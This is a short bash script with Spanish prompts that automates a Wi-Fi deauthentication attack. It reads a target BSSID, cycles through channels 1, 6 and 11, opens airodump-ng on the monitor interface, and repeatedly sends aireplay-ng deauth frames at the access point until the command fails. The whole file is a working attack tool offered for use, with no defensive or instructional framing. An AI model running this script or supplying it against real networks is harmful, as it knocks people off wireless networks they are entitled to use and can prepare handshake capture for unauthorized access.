#!/bin/bash
arreglo_de_canales=(
    1
    6
    11
)

echo "	Ingrese bssid"

read var_bssid
echo " "
echo "El bssid es $var_bssid"
echo " "

while :
do
	for i in "${arreglo_de_canales[@]}"; do
		echo "Canal $i"
		echo "	Analizar"
		
		echo " "
		
		
		echo "	Desautenticando"
		echo "******************************************"
		
			x-terminal-emulator -e airodump-ng wlan0mon -c $i --bssid $var_bssid &
		echo "******************************************"
		sleep 3
		while :
		do
			aireplay-ng --deauth 10 -a $var_bssid wlan0mon
		
			if [ $? -ne 0 ]; then 
			pkill airodump-ng
			break
			else 
			echo "Sí está en canal";

			fi
		
		done 
		echo "..."
		sleep 3
		
		echo "*******************************************"
		sleep 1
	done
done
